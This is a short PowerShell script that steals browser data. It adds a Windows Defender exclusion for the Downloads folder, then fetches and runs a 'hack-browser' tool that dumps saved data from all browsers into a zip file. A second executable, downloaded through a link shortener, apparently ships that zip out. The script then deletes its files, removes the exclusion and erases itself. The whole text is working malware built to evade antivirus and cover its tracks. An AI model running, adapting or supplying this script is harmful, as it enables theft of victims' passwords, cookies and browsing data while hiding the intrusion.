#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
#Creating the directory we will work on
mkdir "$env:USERPROFILE\Downloads\digi"
Set-Location "$env:USERPROFILE\Downloads\digi"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest -Uri "https://transfer.sh/MOVevw/hack-browrser.exe" -OutFile "$env:USERPROFILE\Downloads\digi\hb.exe"
./hb.exe -b all -f json --dir results -zip
Remove-Item -Path "$env:USERPROFILE\Downloads\digi\hb.exe" -Force
#zip shipping
Set-Location "$env:USERPROFILE\Downloads\digi\results"
Invoke-WebRequest -Uri "https://acortar.link/CFV7AS" -OutFile "$env:USERPROFILE\Downloads\digi\results\server.exe"
./server.exe
#Cleanup
cd "$env:USERPROFILE\Downloads"
Remove-Item -Path "$env:USERPROFILE\Downloads\digi" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
Remove-Item -Path "$env:USERPROFILE\Downloads\powershellcode.ps1" -Force
